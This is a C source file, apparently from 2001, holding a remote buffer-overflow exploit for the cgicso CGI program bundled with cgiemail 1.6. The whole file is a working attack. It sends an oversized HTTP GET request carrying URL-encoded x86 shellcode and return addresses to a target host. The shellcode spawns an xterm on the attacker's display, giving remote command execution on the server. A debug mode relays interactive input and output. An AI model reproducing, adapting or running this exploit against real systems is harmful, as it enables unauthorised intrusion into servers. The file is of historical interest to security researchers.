/*
 * cso.c (06/30/01)
 *
 * Remote exploit for cgicso included with cgiemail 1.6
 * Tested on Slackware Linux 7.1 running Apache 1.3.20
 * Spawns an xterm on your display.
 *
 *
 * Note: In order to exploit, cgicso must be compiled with
 * CGI_CSO_HARDCODE undefined, otherwise it will bypass
 * the exploitable portion of code.
 *
 *
 * Exploit By: isox of hhp. (isox@chainsawbeer.com)
 * Site: www.hhp-programming.net && 0xc0ffee.com
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define RET 0xbfffe208 // Slackware 7.1.0
#define LEN 2038
#define PORT 80

char noncode[] =
  "\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b"
  "\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88"
  "\x34\x32\x31\xd2\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d"
  "\x7e\x19\x89\x7e\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e"
  "\x36\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xac\xff\xff\xff"
  "/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K";

char code[] =
  "%eb%4f%5e%31%d2%88%56%14%88%56%18%88%56%21%b2%2b%31%c9%b1%9%80%3c"
  "%32%4b%74%5%42%e2%f7%eb%2b%88%34%32%31%d2%89%f3%89%76%36%8d%7e%15"
  "%89%7e%3a%8d%7e%19%89%7e%3e%8d%7e%22%89%7e%42%89%56%46%8d%4e%36%8d"
  "%56%46%31%c0%b0%b%cd%80%31%db%89%d8%40%cd%80%e8%ac%ff%ff%ff%2f%75"
  "%73%72%2f%58%31%31%52%36%2f%62%69%6e%2f%78%74%65%72%6d%38%2d%75%74"
  "%38%2d%64%69%73%70%6c%61%79%38"
  "%31%32%37%2e%30%2e%30%2e%31" // unicoded IP address
  "%3a%30%4b";



int main(int argc, char *argv[]) {
  char *buf, *p;
  long *addressp, address=RET;
  int i, diff=(strlen(code) - strlen(noncode)), sock, debug=0;
  struct hostent *t;
  struct sockaddr_in s;


  if(argc < 2) {
    fprintf(stderr, "usage: %s <host> [offset [--debug]]\n", argv[0]);
    exit(-1);
  }

  if(argc > 2)
    address -= atoi(argv[2]);

  if(argc > 3) {
    if((!strcmp(argv[3], "--debug")) || (!strcmp(argv[3], "-d")))
      debug = 1;
  }


  fprintf(stderr, "Using Address: 0x%lx\n", address);

  buf = (char *)malloc(44 + LEN + diff + 1);
  p = buf;


  (*p++) = 'G';
  (*p++) = 'E';
  (*p++) = 'T';
  (*p++) = ' ';
  (*p++) = '/';
  (*p++) = 'c';
  (*p++) = 'g';
  (*p++) = 'i';
  (*p++) = '-';
  (*p++) = 'b';
  (*p++) = 'i';
  (*p++) = 'n';
  (*p++) = '/';
  (*p++) = 'c';
  (*p++) = 'g';
  (*p++) = 'i';
  (*p++) = 'c';
  (*p++) = 's';
  (*p++) = 'o';
  (*p++) = '?';
  (*p++) = 'f';
  (*p++) = 'i';
  (*p++) = 'n';
  (*p++) = 'g';
  (*p++) = 'e';
  (*p++) = 'r';
  (*p++) = 'h';
  (*p++) = 'o';
  (*p++) = 's';
  (*p++) = 't';
  (*p++) = '=';
  (*p++) = 'A'; // Yes this should be an A
  (*p++) = '&';
  (*p++) = 'q';
  (*p++) = 'u';
  (*p++) = 'e';
  (*p++) = 'r';
  (*p++) = 'y';
  (*p++) = '=';
  (*p++) = 'A'; // Yes this should be an A
  (*p++) = 'A'; // Yes this should be an A
  (*p++) = 'A'; // Yes this should be an A

  for(i=0; i<strlen(code); i++)
    (*p++) = code[i];

  addressp = (long *)p;

  for(i=0; i<(LEN - strlen(code)) + diff; i+=4)
    (*addressp++) = address;


  strcat(buf, "\n\n");
  fprintf(stderr, "Using length: %d\n", strlen(buf));




/*
 * Connect
 */

  if(s.sin_addr.s_addr=inet_addr(argv[1])) {
    if(!(t=gethostbyname(argv[1]))) {
      printf("Connection Failed.\n");
      exit(-1);
    }

    memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));
  }

  s.sin_family=AF_INET;
  s.sin_port=htons(PORT);

  sock=socket(AF_INET,SOCK_STREAM,0);


  if(connect(sock,(struct sockaddr*)&s,sizeof(s))) {
    fprintf(stderr, "Connection failed.\n");
    exit(-1);
  }

  fprintf(stderr, "done.\n");
  fprintf(stderr, "Sending buffer... ");
  send(sock, buf, strlen(buf), 0);
  fprintf(stderr, "done.\n");

  sleep(2);

  if(debug == 1) {
    fprintf(stderr, "Entering Debug Mode... \n");
    initstream(sock);
  }

  close(sock);
  free(buf);
  exit(0);
}



int initstream(int sock) {
  int n;
  char recvbuf[1024];
  fd_set rset;

  while (1) {
    FD_ZERO(&rset);
    FD_SET(sock,&rset);
    FD_SET(STDIN_FILENO,&rset);
    select(sock+1,&rset,NULL,NULL,NULL);

    if (FD_ISSET(sock,&rset)) {
      if((n=read(sock,recvbuf,1024)) <= 0) {
        printf("Connection closed by foreign host.\n");
        exit(0);
      }

      recvbuf[n]=0;
      printf("%s",recvbuf);
    }

    if (FD_ISSET(STDIN_FILENO,&rset)) {
      if((n=read(STDIN_FILENO,recvbuf,1024)) > 0) {
        recvbuf[n]=0;
        write(sock,recvbuf,n);
      }
    }
  }

  return;
}
